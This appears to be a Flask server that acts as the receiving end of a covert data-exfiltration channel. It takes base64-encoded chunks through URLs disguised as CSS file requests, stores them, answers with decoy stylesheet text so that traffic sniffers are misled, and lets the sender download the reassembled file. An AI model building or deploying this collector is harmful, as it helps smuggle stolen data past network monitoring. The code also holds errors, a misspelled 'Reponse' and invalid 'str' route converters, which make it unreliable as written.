from flask import Flask, Response
from lib import InMemoryStore

app = Flask(__name__)

# do we need to worry about thread safety?
storage = InMemoryStore()

# the data we receive is encoded in an alternative base64 as per RFC 3548
# we also return some random css in case some clever fellow decides
# to sniff traffic and ask for the file


@app.route('/<str:file_key>')
def download(file_key):
    return Reponse(storage.get(file_key), mimetype='application/octet-stream')


@app.route('/<str:file_key>/<int:idx>/<str:chunk>.css', methods=['GET'])
def store(file_key, idx, chunk):
    storage.add(key=file_key, idx=idx, chunk=chunk)
    ret = '''
    p {
    font-family: verdana;
    font-size: 20px;
    }'''
    return Response(ret, mimetype='text/css')


@app.route('/', methods=['GET'])
def test():
    return "Welcome to Flask!"
